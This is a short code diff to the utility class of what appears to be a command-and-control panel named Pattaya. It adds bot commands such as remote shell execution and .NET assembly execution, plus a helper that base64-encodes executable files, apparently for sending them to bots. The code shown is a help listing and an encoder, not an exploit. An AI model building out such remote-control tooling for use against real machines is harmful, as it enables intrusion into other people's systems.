@@ -1,6 +1,6 @@
 from datetime import datetime
 from beautifultable import BeautifulTable
-
+import base64
 
 
 class PattayaPanelUtil:
@@ -40,8 +40,29 @@ class PattayaPanelUtil:
         table.rows.append(["help", "Get Pattaya help terminal"])
         table.rows.append(["pingbot", "Handshake with current bot"])
         table.rows.append(["killbot", "Shutdown/Kill current bot"])
+        table.rows.append(["cd", "Change bot directory"])
+        table.rows.append(["mkdir", "Create directory"])
+        table.rows.append(["rmdir", "Delete directory"])
+        table.rows.append(["ls", "List directory"])
+        table.rows.append(["ps", "List all processes"])
+        table.rows.append(["pwd", "Print current working directory"])
+        table.rows.append(["whoami", "Get current username"])
+        table.rows.append(["shell", "Execute shell command"])
+        table.rows.append(["execute-assembly", "Execute .Net assembly"])
+        table.rows.append(["clear", "Clear terminal"])
+        
         table.columns.header = ["Command", "Description"]
         return "All terminal commands list\n" + str(table)
+    
+
+    @staticmethod
+    def base64_file_encode(file_name):
+        with open(file_name, 'rb') as file:
+            exe_bytes = file.read()
+
+        base64_bytes = base64.b64encode(exe_bytes)
+        base64_exe = base64_bytes.decode('utf-8')
+        return base64_exe
 
     @staticmethod
     def get_banner():
